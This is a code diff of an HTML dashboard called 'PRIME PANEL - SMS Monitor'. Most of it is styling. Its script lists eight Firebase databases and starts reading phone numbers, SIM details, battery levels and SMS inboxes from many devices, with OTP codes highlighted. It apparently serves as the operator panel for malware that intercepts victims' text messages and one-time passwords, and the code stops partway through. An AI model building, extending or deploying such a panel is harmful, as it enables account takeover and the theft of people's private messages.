@@ -2,608 +2,501 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>PRIME PANEL · Unified</title>
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
-    </script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRIME PANEL - SMS Monitor</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
-        /* ── RESET & BASE ── */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        :root {
-            --bg-primary: #0b0f1a;
-            --bg-card: #131b2e;
-            --bg-card-hover: #1a243c;
-            --border-subtle: rgba(64, 128, 255, 0.08);
-            --border-active: rgba(64, 128, 255, 0.25);
-            --text-primary: #e8edf5;
-            --text-secondary: #8a9bb5;
-            --text-muted: #4a5a75;
-            --accent: #4a9eff;
-            --accent-glow: rgba(74, 158, 255, 0.15);
-            --online: #2ecc71;
-            --offline: #5a6a7a;
-            --battery-good: #2ecc71;
-            --battery-mid: #f1c40f;
-            --battery-low: #e74c3c;
-            --radius: 14px;
-            --radius-sm: 10px;
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
-        }
-
-        html {
-            font-size: 16px;
-            -webkit-tap-highlight-color: transparent;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0e17;
+            color: #e0e0e0;
             min-height: 100vh;
-            padding: 12px 12px 80px 12px;
-            overflow-x: hidden;
-        }
-
-        ::-webkit-scrollbar {
-            width: 3px;
-            height: 3px;
-        }
-        ::-webkit-scrollbar-track {
-            background: transparent;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--text-muted);
-            border-radius: 10px;
+            padding: 12px;
         }
 
         .container {
-            max-width: 480px;
+            max-width: 1400px;
             margin: 0 auto;
         }
 
-        /* ── HEADER ── */
         .header {
-            background: var(--bg-card);
-            border: 1px solid var(--border-subtle);
-            border-radius: var(--radius);
-            padding: 16px 18px;
-            margin-bottom: 16px;
-            box-shadow: var(--shadow);
-            backdrop-filter: blur(4px);
-            -webkit-backdrop-filter: blur(4px);
-        }
-
-        .header-top {
             display: flex;
             justify-content: space-between;
             align-items: center;
+            padding: 12px 20px;
+            background: rgba(20, 30, 50, 0.8);
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.08);
+            margin-bottom: 12px;
             flex-wrap: wrap;
             gap: 8px;
         }
 
-        .header-title {
-            font-size: 1.25rem;
+        .header-left h1 {
+            font-size: 18px;
+            color: #4fc3f7;
             font-weight: 700;
-            background: linear-gradient(135deg, #4a9eff, #7c5cfc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -0.3px;
         }
 
-        .header-badge {
+        .header-left .subtitle {
+            font-size: 10px;
+            color: #8899aa;
+            letter-spacing: 1px;
+        }
+
+        .header-right {
             display: flex;
             align-items: center;
-            gap: 6px;
-            font-size: 0.6rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            color: var(--online);
-            background: rgba(46, 204, 113, 0.12);
-            padding: 4px 12px;
-            border-radius: 40px;
-            border: 1px solid rgba(46, 204, 113, 0.15);
-        }
-
-        .header-badge .dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: var(--online);
-            animation: pulse-dot 1.8s ease-in-out infinite;
-        }
-
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.4;
-                transform: scale(0.8);
-            }
-        }
-
-        .header-stats {
-            display: flex;
-            gap: 20px;
-            margin-top: 10px;
-            padding-top: 10px;
-            border-top: 1px solid var(--border-subtle);
-        }
-
-        .stat-item {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .stat-item .number {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: var(--text-primary);
-            line-height: 1.2;
-        }
-
-        .stat-item .number.online {
-            color: var(--online);
-        }
-
-        .stat-item .label {
-            font-size: 0.55rem;
-            text-transform: uppercase;
-            letter-spacing: 0.6px;
-            color: var(--text-muted);
-        }
-
-        .stat-item .label .highlight {
-            color: var(--text-secondary);
-        }
-
-        /* ── SOURCE SELECTOR ── */
-        .source-selector {
-            display: flex;
-            gap: 6px;
-            overflow-x: auto;
-            padding: 4px 0 12px 0;
-            scrollbar-width: none;
-            -webkit-overflow-scrolling: touch;
-        }
-
-        .source-selector::-webkit-scrollbar {
-            display: none;
-        }
-
-        .source-btn {
-            flex-shrink: 0;
-            padding: 6px 14px;
-            border-radius: 40px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-subtle);
-            color: var(--text-secondary);
-            font-size: 0.65rem;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-            cursor: pointer;
-            transition: all 0.2s;
-            white-space: nowrap;
-            text-transform: lowercase;
-        }
-
-        .source-btn.active {
-            background: var(--accent);
-            color: #fff;
-            border-color: var(--accent);
-            box-shadow: 0 0 20px var(--accent-glow);
-        }
-
-        .source-btn:active {
-            transform: scale(0.96);
-        }
-
-        /* ── SEARCH & FILTER ── */
-        .toolbar {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 14px;
+            gap: 16px;
             flex-wrap: wrap;
         }
 
-        .search-wrap {
-            flex: 1;
-            min-width: 140px;
-            position: relative;
+        .header-right .stats {
+            display: flex;
+            gap: 20px;
         }
 
-        .search-wrap input {
-            width: 100%;
-            padding: 10px 14px 10px 36px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-subtle);
-            border-radius: var(--radius-sm);
-            color: var(--text-primary);
-            font-size: 0.8rem;
-            outline: none;
-            transition: border 0.2s;
+        .header-right .stat-item {
+            text-align: center;
         }
 
-        .search-wrap input::placeholder {
-            color: var(--text-muted);
+        .header-right .stat-item .number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4fc3f7;
         }
 
-        .search-wrap input:focus {
-            border-color: var(--accent);
+        .header-right .stat-item .number.online {
+            color: #4caf50;
         }
 
-        .search-wrap .icon {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-muted);
-            font-size: 0.8rem;
-            pointer-events: none;
+        .header-right .stat-item .label {
+            font-size: 9px;
+            color: #8899aa;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
-        .filter-group {
+        .refresh-btn {
+            background: rgba(79, 195, 247, 0.1);
+            color: #4fc3f7;
+            border: 1px solid rgba(79, 195, 247, 0.2);
+            padding: 5px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .refresh-btn:hover {
+            background: rgba(79, 195, 247, 0.2);
+        }
+
+        .live-badge {
+            font-size: 10px;
+            color: #4caf50;
+            background: rgba(76, 175, 80, 0.15);
+            padding: 2px 10px;
+            border-radius: 12px;
+            border: 1px solid rgba(76, 175, 80, 0.2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .sim-slots {
             display: flex;
             gap: 4px;
-            background: var(--bg-card);
-            border-radius: var(--radius-sm);
-            padding: 3px;
-            border: 1px solid var(--border-subtle);
+            margin-bottom: 12px;
+            flex-wrap: wrap;
         }
 
-        .filter-group button {
+        .sim-slot {
+            background: rgba(20, 30, 50, 0.6);
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 6px;
             padding: 6px 14px;
-            border-radius: 8px;
-            border: none;
-            background: transparent;
-            color: var(--text-secondary);
-            font-size: 0.65rem;
+            min-width: 40px;
+            text-align: center;
+            font-size: 11px;
             font-weight: 600;
+            color: #8899aa;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.3s;
         }
 
-        .filter-group button.active {
-            background: var(--accent);
-            color: #fff;
-            box-shadow: 0 0 16px var(--accent-glow);
+        .sim-slot:hover {
+            border-color: rgba(79, 195, 247, 0.2);
+            background: rgba(79, 195, 247, 0.05);
         }
 
-        .filter-group button:active {
-            transform: scale(0.94);
+        .sim-slot.active {
+            border-color: #4fc3f7;
+            color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.08);
         }
 
-        /* ── DEVICE GRID ── */
-        .device-grid {
+        .sim-slot .slot-number {
+            font-size: 9px;
+            color: #556;
+        }
+
+        .main-layout {
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 12px;
+        }
+
+        @media (max-width: 1024px) {
+            .main-layout {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .devices-panel {
+            background: rgba(20, 30, 50, 0.6);
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 14px;
+        }
+
+        .panel-header {
             display: flex;
-            flex-direction: column;
-            gap: 8px;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .panel-header h2 {
+            font-size: 14px;
+            color: #c8d0d8;
+            font-weight: 500;
+        }
+
+        .panel-header .badge {
+            font-size: 10px;
+            color: #8899aa;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 2px 10px;
+            border-radius: 10px;
+        }
+
+        .search-box {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+
+        .search-box input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 6px;
+            padding: 6px 12px;
+            color: #c8d0d8;
+            font-size: 12px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        .search-box input::placeholder {
+            color: #445;
+        }
+
+        .search-box input:focus {
+            border-color: rgba(79, 195, 247, 0.2);
+        }
+
+        .toggle-group {
+            display: flex;
+            gap: 3px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 6px;
+            padding: 2px;
+        }
+
+        .toggle-group button {
+            background: transparent;
+            border: none;
+            color: #8899aa;
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-size: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .toggle-group button.active {
+            background: rgba(79, 195, 247, 0.12);
+            color: #4fc3f7;
+        }
+
+        .toggle-group button:hover:not(.active) {
+            color: #c8d0d8;
+        }
+
+        .devices-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 6px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding-right: 3px;
+        }
+
+        .devices-grid::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .devices-grid::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 2px;
+        }
+
+        .devices-grid::-webkit-scrollbar-thumb {
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 2px;
         }
 
         .device-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-subtle);
-            border-radius: var(--radius-sm);
-            padding: 12px 14px;
-            transition: all 0.2s;
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 8px;
+            padding: 10px 14px;
+            border: 1px solid rgba(100, 150, 255, 0.04);
             cursor: pointer;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-            animation: fadeSlide 0.25s ease;
+            transition: all 0.2s;
         }
 
-        .device-card:active {
-            transform: scale(0.98);
+        .device-card:hover {
+            border-color: rgba(79, 195, 247, 0.1);
+            background: rgba(0, 0, 0, 0.35);
         }
 
-        .device-card .row {
+        .device-card.selected {
+            border-color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.06);
+        }
+
+        .device-card.offline {
+            opacity: 0.4;
+        }
+
+        .device-card .device-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
-            gap: 6px;
         }
 
-        .device-card .id {
-            font-family: 'SF Mono', 'Menlo', monospace;
-            font-size: 0.6rem;
-            color: var(--text-muted);
-            letter-spacing: 0.2px;
-            word-break: break-all;
+        .device-card .device-id {
+            font-family: monospace;
+            font-size: 11px;
+            color: #667;
         }
 
-        .device-card .phone {
-            font-size: 0.85rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            gap: 6px;
+        .device-card .device-phone {
+            font-size: 13px;
+            color: #c8d0d8;
+            font-weight: 500;
         }
 
-        .device-card .phone .copy-btn {
-            font-size: 0.65rem;
-            color: var(--text-muted);
-            background: rgba(255, 255, 255, 0.04);
-            padding: 2px 8px;
-            border-radius: 20px;
+        .device-card .device-phone.copyable {
             cursor: pointer;
-            transition: background 0.2s;
-            border: none;
-            color: var(--text-secondary);
+            color: #4fc3f7;
         }
 
-        .device-card .phone .copy-btn:active {
-            background: rgba(255, 255, 255, 0.1);
+        .device-card .device-phone.copyable:hover {
+            text-decoration: underline;
         }
 
-        .device-card .badges {
+        .device-card .device-status {
             display: flex;
             align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
+            gap: 8px;
         }
 
-        .badge-status {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            font-size: 0.55rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.4px;
-            padding: 2px 10px 2px 6px;
-            border-radius: 40px;
-        }
-
-        .badge-status.online {
-            background: rgba(46, 204, 113, 0.12);
-            color: var(--online);
-        }
-
-        .badge-status.offline {
-            background: rgba(90, 106, 122, 0.15);
-            color: var(--offline);
-        }
-
-        .badge-status .dot {
-            width: 5px;
-            height: 5px;
+        .device-card .status-dot {
+            width: 6px;
+            height: 6px;
             border-radius: 50%;
             display: inline-block;
         }
 
-        .badge-status.online .dot {
-            background: var(--online);
-        }
-        .badge-status.offline .dot {
-            background: var(--offline);
+        .device-card .status-dot.online {
+            background: #4caf50;
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
         }
 
-        .badge-battery {
-            font-size: 0.65rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 3px;
+        .device-card .status-dot.offline {
+            background: #444;
         }
 
-        .badge-battery .level {
-            width: 28px;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.06);
-            border-radius: 6px;
-            overflow: hidden;
-            position: relative;
+        .device-card .battery {
+            font-size: 11px;
+            color: #667;
         }
 
-        .badge-battery .level .fill {
-            height: 100%;
-            border-radius: 6px;
-            transition: width 0.3s;
+        .device-card .sms-count {
+            font-size: 10px;
+            color: #556;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 1px 8px;
+            border-radius: 10px;
         }
 
-        .badge-battery .level .fill.good {
-            background: var(--battery-good);
-        }
-        .badge-battery .level .fill.mid {
-            background: var(--battery-mid);
-        }
-        .badge-battery .level .fill.low {
-            background: var(--battery-low);
-        }
-
-        .device-card .sms-preview {
+        .device-card .device-sms-preview {
             margin-top: 6px;
-            font-size: 0.7rem;
-            color: var(--text-muted);
+            padding-top: 6px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 11px;
+            color: #667;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
-            padding-top: 6px;
-            border-top: 1px solid var(--border-subtle);
         }
 
-        .device-card .sms-preview .sender {
-            color: var(--accent);
+        .device-card .device-sms-preview .sender {
+            color: #4fc3f7;
+        }
+
+        .inbox-panel {
+            background: rgba(20, 30, 50, 0.6);
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 14px;
+            display: flex;
+            flex-direction: column;
+            max-height: 600px;
+        }
+
+        .inbox-panel .panel-header {
+            flex-shrink: 0;
+        }
+
+        .inbox-panel .panel-header h2 {
+            font-size: 14px;
+            color: #c8d0d8;
             font-weight: 500;
         }
 
-        .device-card .source-tag {
-            font-size: 0.5rem;
-            color: var(--text-muted);
-            background: rgba(255, 255, 255, 0.04);
-            padding: 2px 8px;
-            border-radius: 20px;
-            text-transform: lowercase;
-            letter-spacing: 0.3px;
+        .inbox-panel .panel-header .device-info {
+            font-size: 11px;
+            color: #667;
         }
 
-        /* ── INBOX PANEL (slide-up) ── */
-        .inbox-panel {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: var(--bg-primary);
-            border-top: 1px solid var(--border-subtle);
-            border-radius: var(--radius) var(--radius) 0 0;
-            padding: 16px 16px 20px 16px;
-            max-height: 70vh;
-            transform: translateY(100%);
-            transition: transform 0.35s cubic-bezier(0.32, 0.72, 0, 1);
-            box-shadow: 0 -12px 48px rgba(0, 0, 0, 0.6);
-            z-index: 100;
+        .inbox-panel .panel-header .device-info strong {
+            color: #c8d0d8;
+        }
+
+        .inbox-messages {
+            flex: 1;
             overflow-y: auto;
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
+            padding-right: 3px;
+            margin-top: 6px;
         }
 
-        .inbox-panel.open {
-            transform: translateY(0);
+        .inbox-messages::-webkit-scrollbar {
+            width: 3px;
         }
 
-        .inbox-panel .handle {
-            width: 40px;
-            height: 4px;
-            background: var(--text-muted);
-            border-radius: 4px;
-            margin: 0 auto 12px auto;
-            opacity: 0.4;
+        .inbox-messages::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 2px;
         }
 
-        .inbox-panel .inbox-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-
-        .inbox-panel .inbox-header h3 {
-            font-size: 0.9rem;
-            font-weight: 600;
-        }
-
-        .inbox-panel .inbox-header .close-btn {
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            font-size: 1.2rem;
-            cursor: pointer;
-            padding: 4px 8px;
-        }
-
-        .inbox-panel .inbox-device-info {
-            font-size: 0.7rem;
-            color: var(--text-secondary);
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid var(--border-subtle);
-        }
-
-        .inbox-panel .inbox-device-info strong {
-            color: var(--text-primary);
+        .inbox-messages::-webkit-scrollbar-thumb {
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 2px;
         }
 
         .inbox-message {
-            background: var(--bg-card);
-            border-radius: var(--radius-sm);
-            padding: 10px 12px;
-            margin-bottom: 6px;
-            border-left: 2px solid var(--accent);
-            animation: fadeSlide 0.2s ease;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 6px;
+            padding: 8px 12px;
+            margin-bottom: 4px;
+            border-left: 2px solid rgba(79, 195, 247, 0.15);
+            animation: slideIn 0.3s ease;
+        }
+
+        .inbox-message .msg-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 3px;
         }
 
         .inbox-message .msg-sender {
-            font-size: 0.6rem;
+            font-size: 11px;
             font-weight: 600;
-            color: var(--accent);
+            color: #4fc3f7;
         }
 
         .inbox-message .msg-time {
-            font-size: 0.5rem;
-            color: var(--text-muted);
-            float: right;
+            font-size: 9px;
+            color: #445;
         }
 
         .inbox-message .msg-body {
-            font-size: 0.75rem;
-            color: var(--text-primary);
-            margin-top: 4px;
+            font-size: 12px;
+            color: #c8d0d8;
             word-break: break-word;
             line-height: 1.4;
         }
 
-        .inbox-message .msg-body .otp {
-            color: #f39c12;
-            font-weight: 700;
-            font-size: 0.85rem;
+        .inbox-message .msg-body .highlight {
+            color: #ff9800;
         }
 
-        .inbox-empty {
+        .inbox-message .msg-body .otp-code {
+            color: #ff9800;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .inbox-placeholder {
             text-align: center;
-            color: var(--text-muted);
-            font-size: 0.8rem;
-            padding: 28px 0;
+            color: #556;
+            font-size: 12px;
+            padding: 30px 0;
         }
 
-        /* ── FAB (Floating Action Button) ── */
-        .fab {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            width: 56px;
-            height: 56px;
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #556;
+            font-size: 12px;
+        }
+
+        .spinner {
+            border: 2px solid rgba(79, 195, 247, 0.1);
+            border-top: 2px solid #4fc3f7;
             border-radius: 50%;
-            background: var(--accent);
-            border: none;
-            color: #fff;
-            font-size: 1.6rem;
-            box-shadow: 0 8px 28px rgba(74, 158, 255, 0.35);
-            cursor: pointer;
-            transition: all 0.2s;
-            z-index: 50;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .fab:active {
-            transform: scale(0.92);
-        }
-
-        .fab .badge {
-            position: absolute;
-            top: -4px;
-            right: -4px;
-            background: #e74c3c;
-            color: #fff;
-            font-size: 0.55rem;
-            font-weight: 700;
             width: 20px;
             height: 20px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 6px;
         }
 
-        /* ── ANIMATIONS ── */
-        @keyframes fadeSlide {
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateY(6px);
+                transform: translateY(-6px);
             }
             to {
                 opacity: 1;
@@ -611,776 +504,651 @@
             }
         }
 
-        /* ── LOADING PLACEHOLDER ── */
-        .loading-placeholder {
-            text-align: center;
-            padding: 40px 0;
-            color: var(--text-muted);
-            font-size: 0.8rem;
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(20, 30, 50, 0.95);
+            padding: 8px 20px;
+            border-radius: 6px;
+            border: 1px solid rgba(79, 195, 247, 0.15);
+            color: #c8d0d8;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
         }
 
-        .loading-placeholder .spinner {
-            width: 28px;
-            height: 28px;
-            border: 3px solid var(--border-subtle);
-            border-top-color: var(--accent);
+        .toast.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(10px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        .notification-dot {
+            display: none;
+            width: 8px;
+            height: 8px;
+            background: #ff9800;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 12px auto;
+            margin-left: 6px;
+            animation: pulse 1s infinite;
         }
 
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+        .notification-dot.show {
+            display: inline-block;
         }
 
-        .no-results {
-            text-align: center;
-            padding: 30px 0;
-            color: var(--text-muted);
-            font-size: 0.8rem;
-        }
-
-        /* ── RESPONSIVE TWEAKS ── */
-        @media (max-width: 420px) {
-            .header-title {
-                font-size: 1rem;
-            }
-            .stat-item .number {
-                font-size: 1.1rem;
-            }
-            .device-card .phone {
-                font-size: 0.75rem;
-            }
-            .filter-group button {
-                padding: 4px 10px;
-                font-size: 0.55rem;
-            }
-            .search-wrap input {
-                font-size: 0.7rem;
-                padding: 8px 10px 8px 30px;
-            }
-            .search-wrap .icon {
-                font-size: 0.7rem;
-                left: 10px;
-            }
-            .source-btn {
-                font-size: 0.55rem;
-                padding: 4px 10px;
-            }
-        }
-
-        @media (min-width: 600px) {
-            body {
-                padding: 20px 30px 100px 30px;
-            }
-            .container {
-                max-width: 720px;
-            }
-            .device-grid {
-                display: grid;
-                grid-template-columns: 1fr 1fr;
-                gap: 10px;
-            }
-            .inbox-panel {
-                max-width: 480px;
-                left: 50%;
-                transform: translateX(-50%) translateY(100%);
-                border-radius: var(--radius);
-            }
-            .inbox-panel.open {
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        @media (min-width: 900px) {
-            .container {
-                max-width: 960px;
-            }
-            .device-grid {
-                grid-template-columns: 1fr 1fr 1fr;
-            }
-            .inbox-panel {
-                max-width: 560px;
-            }
+        @media (max-width: 768px) {
+            body { padding: 8px; }
+            .header { padding: 10px 14px; flex-direction: column; align-items: stretch; }
+            .header-right { justify-content: space-between; }
+            .main-layout { grid-template-columns: 1fr; }
+            .inbox-panel { max-height: 350px; }
+            .devices-grid { max-height: 300px; }
+            .sim-slots { justify-content: center; }
         }
     </style>
 </head>
 <body>
 
-    <div class="container" id="app">
-        <!-- HEADER -->
-        <header class="header">
-            <div class="header-top">
-                <span class="header-title">📡 PRIME PANEL</span>
-                <span class="header-badge">
-                    <span class="dot"></span> LIVE
-                </span>
-            </div>
-            <div class="header-stats">
-                <div class="stat-item">
-                    <span class="number online" id="onlineCount">0</span>
-                    <span class="label">Online</span>
-                </div>
-                <div class="stat-item">
-                    <span class="number" id="totalCount">0</span>
-                    <span class="label">Total <span class="highlight">Devices</span></span>
-                </div>
-                <div class="stat-item">
-                    <span class="number" id="smsCount">0</span>
-                    <span class="label">SMS <span class="highlight">Logs</span></span>
-                </div>
-            </div>
-        </header>
-
-        <!-- SOURCE SELECTOR -->
-        <div class="source-selector" id="sourceSelector">
-            <!-- populated by JS -->
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <h1>📱 PRIME PANEL</h1>
+            <div class="subtitle">REAL-TIME SMS MONITORING SYSTEM</div>
         </div>
-
-        <!-- TOOLBAR -->
-        <div class="toolbar">
-            <div class="search-wrap">
-                <span class="icon">🔍</span>
-                <input type="text" id="searchInput" placeholder="Search ID or phone..." inputmode="search">
+        <div class="header-right">
+            <span class="live-badge">● LIVE</span>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="number online" id="onlineCount">0</div>
+                    <div class="label">ONLINE</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number" id="smsCount">0</div>
+                    <div class="label">NEW SMS</div>
+                </div>
             </div>
-            <div class="filter-group">
-                <button class="active" data-filter="all">All</button>
-                <button data-filter="online">Online</button>
-            </div>
-        </div>
-
-        <!-- DEVICE GRID -->
-        <div class="device-grid" id="deviceGrid">
-            <div class="loading-placeholder">
-                <div class="spinner"></div>
-                <span>Loading devices…</span>
-            </div>
+            <button class="refresh-btn" onclick="manualRefresh()">🔄 Refresh</button>
         </div>
     </div>
 
-    <!-- INBOX PANEL (slide-up) -->
-    <div class="inbox-panel" id="inboxPanel">
-        <div class="handle"></div>
-        <div class="inbox-header">
-            <h3>📨 Inbox</h3>
-            <button class="close-btn" id="closeInboxBtn">✕</button>
-        </div>
-        <div class="inbox-device-info" id="inboxDeviceInfo">
-            <strong>Device</strong> · <span id="inboxPhone">—</span> · 🔋 <span id="inboxBattery">—</span>
-        </div>
-        <div id="inboxMessagesContainer">
-            <div class="inbox-empty">Select a device to view messages</div>
-        </div>
+    <!-- SIM Slots -->
+    <div class="sim-slots" id="simSlots">
+        <div class="sim-slot active"><span class="slot-number">📱</span> S1</div>
+        <div class="sim-slot">S2</div>
+        <div class="sim-slot">S3</div>
+        <div class="sim-slot">S4</div>
+        <div class="sim-slot">S5</div>
+        <div class="sim-slot">S6</div>
+        <div class="sim-slot">S7</div>
+        <div class="sim-slot">S8</div>
     </div>
 
-    <!-- FAB -->
-    <button class="fab" id="fabBtn" aria-label="Open Inbox">
-        💬
-        <span class="badge" id="fabBadge" style="display:none;">0</span>
-    </button>
-
-    <script>
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 1. CONFIG — ALL DATABASE URLs (8 sources)
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        const SOURCES = [
-            // --- PRIMARY SOURCE (your original) ---
-            { id: 'sssssmmmmsw', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app/' },
-            // --- OTHER SOURCES ---
-            { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/' },
-            { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/' },
-            { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/' },
-            { id: 'strboii', url: 'https://strboii-default-rtdb.firebaseio.com/' },
-            { id: 'kalui', url: 'https://kalui-a8e2b-default-rtdb.firebaseio.com/' },
-            { id: 'babayou', url: 'https://babayou-ca160-default-rtdb.firebaseio.com/' },
-            { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/' },
-        ];
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 2. STATE
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        let allDevices = {}; // key: compositeId, value: device object
-        let deviceList = []; // array of { id, source, data }
-        let selectedSource = 'all'; // 'all' or source id
-        let filterMode = 'all'; // 'all' or 'online'
-        let searchQuery = '';
-        let selectedDeviceId = null; // composite id
-
-        // Firebase app instances cache
-        const apps = {};
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 3. HELPERS
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function getCompositeId(sourceId, deviceId) {
-            return `${sourceId}::${deviceId}`;
-        }
-
-        function getPhoneNumber(device) {
-            if (!device) return null;
-            // Try common fields
-            if (device.mobNo) return device.mobNo;
-            if (device.mobile) return device.mobile;
-            if (device.phone) return device.phone;
-            if (device.phoneNumber) return device.phoneNumber;
-            // Sometimes inside sims array
-            if (device.sims && Array.isArray(device.sims)) {
-                for (const sim of device.sims) {
-                    if (sim.phoneNumber) return sim.phoneNumber;
-                }
-            }
-            return null;
-        }
-
-        function getBattery(device) {
-            if (!device) return null;
-            let val = device.battery;
-            if (val !== undefined && val !== null) {
-                if (typeof val === 'string') {
